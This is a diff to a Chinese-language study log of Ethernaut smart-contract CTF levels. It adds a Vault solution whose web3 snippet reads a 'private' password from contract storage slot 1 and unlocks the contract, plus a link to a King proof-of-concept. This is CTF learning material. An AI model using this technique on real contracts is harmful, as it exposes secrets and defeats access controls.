@@ -200,6 +200,25 @@ A合约中 调用 B.delegatecall() B 合约中 msg.sender 与 A 合约的 msg.se
 
 **Level 08 Vault**
 
+这个题，我尝试看是否有办法通过构造函数传入的数据来获取到 password ，但是没有找到。
+我还是 google 去找答案了。
+
+区块链上的变量都存在 slot 中可以，通过 slot 获取到，及时他是 private 的
+
+```
+web3.eth.getStorageAt(instance.address, 1, (err,res) => {
+   contract.unlock(web3.utils.hexToAscii(res))
+   //A very strong secret password :)
+});
+```
+
+### 2024.09.02
+
+**Level 09 King**
+
+[POC 代码](Writeup/SpeedX/src/Ethernaut/king_poc.s.sol)
+
+
 
 
 <!-- Content_END -->
